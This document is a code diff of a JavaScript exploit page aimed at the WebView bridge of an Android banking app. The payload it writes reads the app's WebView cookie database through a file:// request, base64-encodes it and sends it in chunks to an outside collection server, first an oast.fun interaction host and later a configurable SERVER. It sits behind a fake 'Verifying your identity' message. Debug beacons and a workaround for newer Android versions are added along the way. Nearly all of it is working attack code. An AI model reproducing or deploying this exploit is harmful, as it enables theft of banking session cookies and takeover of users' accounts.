@@ -22,38 +22,47 @@ function log(step) {
     new Image().src = SERVER + "/log?step=" + encodeURIComponent(step);
 }
 
-// Step 1: Confirm the page loaded at all
 log("1-page-loaded");
 
-// Step 2: Check if the JS bridge exists
 if (typeof WebViewFragment === "undefined") {
     log("FAIL-no-bridge");
 } else {
     log("2-bridge-exists");
 
-    // Step 3: Try DYNAMIC_DOWNLOAD_DOCUMENT
     try {
-        var testHtml = '<html><body><p>Verifying your identity...</p><script>' +
-            'var stolen = "placeholder";' +
-            'var target = "/data/data/com.rbc.mobile.android/app_webview/Default/Cookies";' +
-            'var xhr = new XMLHttpRequest();' +
-            'xhr.open("GET", "file://" + target, true);' +
-            'xhr.responseType = "arraybuffer";' +
-            'xhr.onload = function() {' +
-            '  var b64 = arrayBufferToBase64(xhr.response);' +
-            '  var chunkSize = 4000;' +
-            '  var chunks = Math.ceil(b64.length / chunkSize);' +
-            '  for (var i = 0; i < chunks; i++) {' +
-            '    var chunk = b64.substr(i * chunkSize, chunkSize);' +
-            '    WebViewFragment.onNavigateWebHook(JSON.stringify({' +
-            '      "version": "1.2",' +
-            '      "type": "externalWebview",' +
-            '      "destination": "https://gizpalpqzbbirxtdwlksdibaz8ggn9c43.oast.fun/collect?i=" + i + "&t=" + chunks + "&d=" + encodeURIComponent(chunk)' +
-            '    }));' +
-            '  }' +
-            '};' +
-            'xhr.send();' +
-            '<\\/script></body></html>';
+        var testHtml = '<html><body><p id="s">Loading...</p><script>' +
+            'var S="' + SERVER + '";' +
+            'function arrayBufferToBase64(buf){' +
+            'var bin="";var bytes=new Uint8Array(buf);' +
+            'for(var j=0;j<bytes.byteLength;j++){' +
+            'bin+=String.fromCharCode(bytes[j]);}' +
+            'return btoa(bin);}' +
+            'document.getElementById("s").innerText="Running...";' +
+            'try{new Image().src=S+"/log?step=verify-loaded";}catch(e){}' +
+            'if(typeof WebViewFragment==="undefined"){' +
+            'document.getElementById("s").innerText="No bridge";' +
+            'try{new Image().src=S+"/log?step=verify-no-bridge";}catch(e){}' +
+            '}else{' +
+            'try{new Image().src=S+"/log?step=verify-has-bridge";}catch(e){}' +
+            'var target="/data/data/com.rbc.mobile.android/app_webview/Default/Cookies";' +
+            'var xhr=new XMLHttpRequest();' +
+            'xhr.open("GET","file://"+target,true);' +
+            'xhr.responseType="arraybuffer";' +
+            'xhr.onload=function(){' +
+            'try{new Image().src=S+"/log?step=xhr-ok&size="+xhr.response.byteLength;}catch(e){}' +
+            'var b64=arrayBufferToBase64(xhr.response);' +
+            'var cs=4000;var n=Math.ceil(b64.length/cs);' +
+            'for(var i=0;i<n;i++){' +
+            'var c=b64.substr(i*cs,cs);' +
+            'WebViewFragment.onNavigateWebHook(JSON.stringify({' +
+            '"version":"1.2","type":"externalWebview",' +
+            '"destination":S+"/collect?i="+i+"&t="+n+"&d="+encodeURIComponent(c)' +
+            '}));}};' +
+            'xhr.onerror=function(){' +
+            'document.getElementById("s").innerText="XHR error";' +
+            'try{new Image().src=S+"/log?step=xhr-error";}catch(e){}};' +
+            'xhr.send();}' +
+            '</' + 'script></body></html>';
 
         WebViewFragment.onFeatureEventWebHook(JSON.stringify({
             "version": "1.2",
@@ -66,13 +75,11 @@ if (typeof WebViewFragment === "undefined") {
         log("FAIL-download-error-" + e.message);
     }
 
-    // Step 4: Navigate to file after short delay
+    // window.location to file:// is blocked on API 36 —
+    // use Click 2 (second deeplink) to load verify.html
     setTimeout(function() {
-        log("4-about-to-navigate");
-        setTimeout(function() {
-            window.location = "file:///storage/emulated/0/Android/data/com.rbc.mobile.android/files/verify.html";
-        }, 500);
-    }, 1500);
+        log("4-waiting-for-click2");
+    }, 2000);
 }
 </script>
 </body>
